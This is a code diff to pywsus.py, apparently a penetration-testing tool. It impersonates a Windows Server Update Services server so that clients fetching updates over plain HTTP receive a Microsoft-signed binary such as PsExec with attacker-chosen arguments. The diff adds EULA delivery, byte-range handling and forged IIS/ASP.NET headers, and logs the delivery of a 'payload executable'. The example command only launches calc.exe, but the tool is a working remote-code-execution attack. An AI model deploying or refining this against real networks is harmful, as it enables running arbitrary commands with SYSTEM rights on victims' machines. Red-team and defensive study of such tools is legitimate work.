@@ -15,7 +15,7 @@ import argparse
 
 
 class WSUSUpdateHandler:
-    def __init__(self, executable_file, executable_name, client_address):
+    def __init__(self, executable_file, executable_name, eula_file, client_address):
         self.get_config_xml = ''
         self.get_cookie_xml = ''
         self.register_computer_xml = ''
@@ -32,6 +32,8 @@ class WSUSUpdateHandler:
         self.executable_name = executable_name
         self.sha1 = ''
         self.sha256 = ''
+
+        self.eula = eula_file
 
         self.client_address = client_address
 
@@ -91,7 +93,7 @@ class WSUSUpdateHandler:
         hash1 = hashlib.sha1()
         hash256 = hashlib.sha256()
         try:
-            data = self.executable
+            data = open(update_handler.executable, 'rb').read()
             hash1.update(data)
             hash256.update(data)
             self.sha1 = base64.b64encode(hash1.digest()).decode()
@@ -107,40 +109,173 @@ class WSUSUpdateHandler:
 
 
 class WSUSBaseServer(BaseHTTPRequestHandler):
-    def _set_response(self, serveEXE=False):
+    def _set_response_post(self):
 
         self.protocol_version = 'HTTP/1.1'
         self.send_response(200)
-        # self.server_version = 'Microsoft-IIS/10.0'
-        # self.send_header('Accept-Ranges', 'bytes')
+        self.server_version = 'Microsoft-IIS/10.0'
+        self.send_header('Accept-Ranges', 'bytes')
         self.send_header('Cache-Control', 'private')
-
-        if serveEXE:
-            self.send_header('Content-Type', 'application/octet-stream')
-            self.send_header("Content-Length", len(update_handler.executable))
-        else:
-            self.send_header('Content-type', 'text/xml; chartset=utf-8')
-
+        self.send_header('Content-Type', 'text/plain')
         self.send_header('X-AspNet-Version', '4.0.30319')
         self.send_header('X-Powered-By', 'ASP.NET')
         self.end_headers()
 
+    def _set_response_eula(self, deliverFile = False):
+
+        self.protocol_version = 'HTTP/1.1'
+        if "Range" in self.headers:
+            self.send_response(206)
+        else:
+            self.send_response(200)
+        self.server_version = 'Microsoft-IIS/10.0'
+        self.send_header('Accept-Ranges', 'bytes')
+        self.send_header('Cache-Control', 'private')
+        self.send_header('Content-Type', 'text/plain')
+        self.send_header("Content-Length", len(update_handler.eula))
+        self.send_header('X-AspNet-Version', '4.0.30319')
+        self.send_header('X-Powered-By', 'ASP.NET')
+        self.end_headers()
+        try:
+            # Always read in binary mode. Opening files in text mode may cause
+            # newline translations, making the actual size of the content
+            # transmitted *less* than the content-length!
+            f = open(update_handler.eula, 'rb')
+            fs = os.fstat(f.fileno())
+            size = int(fs[6])
+            if deliverFile:
+                start_range = 0
+                end_range = size
+                if "Range" in self.headers:
+                    s, e = self.headers['range'][6:].split('-', 1)
+                    sl = len(s)
+                    el = len(e)
+                    if sl > 0:
+                        start_range = int(s)
+                        if el > 0:
+                            end_range = int(e) + 1
+                    elif el > 0:
+                        ei = int(e)
+                        if ei < size:
+                            start_range = size - ei
+                    self.send_header("Content-Range", 'bytes ' + str(start_range) + '-' + str(end_range - 1) + '/' + str(size))
+                    self.send_header("Content-Length", end_range - start_range)
+                    f.seek(start_range, 0)
+                    chunk = 0x1000
+                    total = 0
+                    while chunk > 0:
+                        if start_range + chunk > end_range:
+                            chunk = end_range - start_range
+                        try:
+                            self.wfile.write(f.read(chunk))
+                        except:
+                            break
+                        total += chunk
+                        start_range += chunk
+                else:
+                    self.wfile.write(f.read())
+            else:
+                self.send_header("Content-Length", len(f.read()))
+                #self.wfile.write(update_handler.executable)
+            f.close()
+        except IOError:
+            self.send_error(404, "File not found")
+            return (None, 0, 0)
+        
+
+    def _set_response_executable(self, deliverFile = False):
+
+        self.protocol_version = 'HTTP/1.1'
+        if "Range" in self.headers:
+            self.send_response(206)
+        else:
+            self.send_response(200)
+        
+        #self.send_header('Server', 'Microsoft-IIS/10.0')
+        self.server_version = "Microsoft-IIS/10.0"
+        self.send_header('Accept-Ranges', 'bytes')
+        self.send_header('Cache-Control', 'private')
+        self.send_header('Content-Type', 'application/octet-stream')
+        self.send_header('X-AspNet-Version', '4.0.30319')
+        self.send_header('X-Powered-By', 'ASP.NET')
+        try:
+            # Always read in binary mode. Opening files in text mode may cause
+            # newline translations, making the actual size of the content
+            # transmitted *less* than the content-length!
+            f = open(update_handler.executable, 'rb')
+            fs = os.fstat(f.fileno())
+            size = int(fs[6])
+            if deliverFile:
+                start_range = 0
+                end_range = size
+                if "Range" in self.headers:
+                    s, e = self.headers['range'][6:].split('-', 1)
+                    sl = len(s)
+                    el = len(e)
+                    if sl > 0:
+                        start_range = int(s)
+                        if el > 0:
+                            end_range = int(e) + 1
+                    elif el > 0:
+                        ei = int(e)
+                        if ei < size:
+                            start_range = size - ei
+                    self.send_header("Content-Range", 'bytes ' + str(start_range) + '-' + str(end_range - 1) + '/' + str(size))
+                    self.send_header("Content-Length", end_range - start_range)
+                    self.end_headers()
+                    f.seek(start_range, 0)
+                    chunk = 0x1000
+                    total = 0
+                    while chunk > 0:
+                        if start_range + chunk > end_range:
+                            chunk = end_range - start_range
+                        try:
+                            self.wfile.write(f.read(chunk))
+                        except:
+                            break
+                        total += chunk
+                        start_range += chunk
+                else:
+                    self.end_headers()
+                    self.wfile.write(f.read())
+            else:
+                self.send_header("Content-Length", len(f.read()))
+                self.end_headers()
+                #self.wfile.write(update_handler.executable)
+            f.close()
+        except IOError:
+            self.send_error(404, "File not found")
+            return (None, 0, 0)
+              
+
     def do_HEAD(self):
         logging.debug('HEAD request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))
 
-        if self.path.find(".exe"):
-            logging.info("Requested: {path}".format(path=self.path))
+        if ".exe" in self.path:
+            logging.info("EXE file requested via method 'HEAD'!")
+            #logging.info("EXE file requested: {path}".format(path=self.path))
+            self._set_response_executable(False)
 
-            self._set_response(True)
+        if ".txt" in self.path:
+            logging.info("TXT file requested via method 'HEAD'!")
+            #logging.info("TXT file requested: {path}".format(path=self.path))
+            self._set_response_eula(False)
+
 
     def do_GET(self):
         logging.debug('GET request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))
 
-        if self.path.find(".exe"):
-            logging.info("Requested: {path}".format(path=self.path))
-
-            self._set_response(True)
-            self.wfile.write(update_handler.executable)
+        if ".exe" in self.path:
+            logging.info("EXE file requested via method 'GET'!")
+            #logging.info("EXE file requested: {path}".format(path=self.path))
+            logging.info("Delivering payload executable in response ...")
+            self._set_response_executable(True)
+            
+        if ".txt" in self.path:
+            logging.info("TXT file requested via method 'GET'!")
+            #logging.info("TXT file requested: {path}".format(path=self.path))
+            logging.info("Delivering payload EULA file in response ...")
+            self._set_response_eula(True)
 
     def do_POST(self):
 
@@ -193,7 +328,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
             logging.info('SOAP Action: {}'.format(soap_action))
             return
 
-        self._set_response()
+        self._set_response_post()
         self.wfile.write(data.encode_contents())
 
         logging.info('SOAP Action: {}'.format(soap_action))
@@ -221,12 +356,13 @@ def run(host, port, server_class=HTTPServer, handler_class=WSUSBaseServer):
 
 def parse_args():
     # parse the arguments
-    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython pywsus.py -H X.X.X.X -p 8530 -e PsExec64.exe -c "-accepteula -s calc.exe"')
+    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython3 pywsus.py -H X.X.X.X -p 8530 -b PsExec64.exe -e eula.txt -c "-accepteula -s calc.exe"')
 
     parser._optionals.title = "OPTIONS"
     parser.add_argument('-H', '--host', required=True, help='The listening adress.')
     parser.add_argument('-p', '--port', type=int, default=8530, help='The listening port.')
-    parser.add_argument('-e', '--executable', type=argparse.FileType('rb'), required=True, help='The Microsoft signed executable returned to the client.')
+    parser.add_argument('-b', '--binary', type=str, required=True, help='The Microsoft signed executable returned to the client.')
+    parser.add_argument('-e', '--eula', type=str, required=True, help='The EULA text file being distributed with the update.')
     parser.add_argument('-c', '--command', required=True, help='The parameters for the current executable.')
     parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Increase output verbosity.')
 
@@ -241,11 +377,12 @@ if __name__ == '__main__':
     else:
         logging.basicConfig(level=logging.INFO)
 
-    executable_file = args.executable.read()
-    executable_name = os.path.basename(args.executable.name)
-    args.executable.close()
+    executable_file = args.binary
+    executable_name = os.path.basename(args.binary)
 
-    update_handler = WSUSUpdateHandler(executable_file, executable_name, client_address='{host}:{port}'.format(host=args.host, port=args.port))
+    eula_file = args.eula
+
+    update_handler = WSUSUpdateHandler(executable_file, executable_name, eula_file, client_address='{host}:{port}'.format(host=args.host, port=args.port))
 
     update_handler.set_filedigest()
     update_handler.set_resources_xml(args.command)
@@ -253,3 +390,5 @@ if __name__ == '__main__':
     logging.info(update_handler)
 
     run(host=args.host, port=args.port)
+
+
